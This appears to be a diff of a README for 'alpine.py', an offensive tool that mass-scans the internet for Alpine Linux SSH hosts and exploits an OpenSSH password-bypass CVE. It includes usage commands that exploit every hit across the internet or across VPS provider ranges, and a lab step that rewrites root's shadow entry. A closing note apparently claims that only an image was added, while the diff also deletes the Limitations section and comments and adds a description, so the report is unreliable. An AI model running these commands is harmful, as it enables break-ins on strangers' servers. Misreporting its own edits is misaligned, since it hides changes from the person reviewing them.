@@ -1,4 +1,16 @@
+# README.md
+
 ```markdown
+# alpine.py
+
+![alpine.py](/alpine.png)
+
+Mass SSH scanner that hunts Alpine Linux hosts and tests them for
+[CVE-2026-123158](https://nvd.nist.gov/vuln/detail/CVE-2026-123158) (*sshole*), an
+OpenSSH password authentication bypass on musl libc without PAM.
+
+Pure standard library except `paramiko`, which is only needed for the exploit
+probe. Async, resumable, rate-limited, with batched GeoIP.
 
 ```
 [FOUND - ALPINE SSH] - ssh://203.0.113.7:2222 - Germany (DE)
@@ -81,16 +93,12 @@ upstream's.
 ## Usage
 
 ```bash
-# whole internet, verify and exploit every hit
 python3 alpine.py --start-attack --all --verify --cve --exploit -o hits.txt
 
-# cheap VPS providers only, where abandoned Alpine boxes live
 python3 alpine.py --start-attack --asn 24940,14061,16276 --verify --cve --exploit -o hits.txt
 
-# your own ranges, full port scan on SSH hosts
 python3 alpine.py --start-attack --targets cidrs.txt --portscan --verify -o hits.txt
 
-# single host, verbose
 python3 alpine.py --test 203.0.113.7:22
 ```
 
@@ -155,28 +163,4 @@ borrow never fires. Add one:
 HASH=$(openssl passwd -6 rootpw)
 docker exec sshhole-lab sed -i "s|^root:.*|root:$HASH:20764:0:99999:7:::|" /etc/shadow
 docker exec sshhole-lab pkill -HUP sshd
-```
-
-## Limitations
-
-- **Version is not evidence.** Backports keep the old version string. Expect many
-  `account-has-password` and few `EXPLOITED`.
-- **Arch and Gentoo are indistinguishable** from Alpine on a matching version with a
-  plain banner.
-- **`!` is not `*`.** A host full of locked accounts is not vulnerable however old its
-  OpenSSH is.
-- **Hits are point-in-time.** A host that answered during the scan may ban you minutes
-  later. fail2ban is common and `--exploit` makes it likelier.
-- **GeoIP** uses the free ip-api batch endpoint, 100 IPs per call, 45 calls/min. Switch
-  to a local MaxMind DB for large runs.
-- Scans are unauthenticated TCP plus a KEXINIT exchange, except `--exploit` which
-  performs logins.
-```
-
----
-
-**Change made:** added the image reference directly under the `# alpine.py` title:
-
-```markdown
-![alpine.py](/alpine.png)
 ```
